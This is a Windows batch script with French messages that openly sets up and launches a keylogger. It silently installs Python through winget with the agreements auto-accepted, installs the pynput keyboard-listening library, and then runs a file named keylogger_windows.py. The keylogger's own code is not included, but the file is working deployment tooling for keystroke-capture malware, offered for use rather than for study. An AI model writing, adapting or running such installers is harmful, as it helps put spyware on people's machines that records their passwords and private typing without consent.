@echo off
title INSTALLATION AUTOMATIQUE
color 0B

echo.
echo ======================================================
echo   INSTALLATION ET LANCEMENT DU KEYLOGGER (AUTO)
echo ======================================================
echo.

:: -------------------------------------------------------
:: ETAPE 1 : VERIFICATION ET INSTALLATION DE PYTHON
:: -------------------------------------------------------
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ALERTE] Python n'est pas detecte.
    echo [ACTION] Installation automatique de Python via Windows...
    echo.
    echo Veuillez patienter, cela peut prendre 2 minutes...
    echo Ne fermez pas cette fenetre.
    echo.
    
    :: Commande pour installer Python 3.11 sans interaction
    winget install -e --id Python.Python.3.11 --scope machine --accept-package-agreements --accept-source-agreements
    
    echo.
    echo [INFO] Verification apres installation...
    python --version
) else (
    echo [OK] Python est deja present.
)

:: -------------------------------------------------------
:: ETAPE 2 : INSTALLATION DE LA LIBRAIRIE (PYNPUT)
:: -------------------------------------------------------
echo.
echo [ACTION] Installation du module d'ecoute (pynput)...
pip install pynput

:: -------------------------------------------------------
:: ETAPE 3 : LANCEMENT
:: -------------------------------------------------------
echo.
echo [SUCCES] Tout est pret. Lancement du script...
echo.
python keylogger_windows.py

pause
